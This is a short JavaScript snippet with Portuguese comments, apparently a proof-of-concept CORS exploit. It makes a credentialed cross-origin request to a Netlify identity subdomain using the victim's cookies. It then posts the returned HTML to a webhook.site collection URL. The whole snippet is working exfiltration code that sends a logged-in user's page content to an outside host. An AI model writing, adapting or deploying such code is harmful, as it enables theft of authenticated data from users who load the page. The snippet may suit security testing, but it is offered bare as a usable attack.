var xhr = new XMLHttpRequest();
xhr.open("GET", "https://identity.services.netlify.com/", true);  // Fazendo a requisição para o subdomínio
xhr.withCredentials = true;  // Envia cookies com a requisição CORS

xhr.onreadystatechange = function() {
  if (xhr.readyState == 4 && xhr.status == 200) {
    // A resposta contém o conteúdo HTML da página
    var htmlContent = xhr.responseText;
    
    // Exibe o conteúdo HTML no console
    console.log('Conteúdo HTML da página:', htmlContent);

    // Se você quiser enviar o conteúdo para seu servidor, pode usar fetch:
    fetch('https://webhook.site/d3588a45-b624-453a-8f0a-5e97c1afebd7', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({ html: htmlContent })
    });
  }
};
xhr.send();  // Envia a requisição
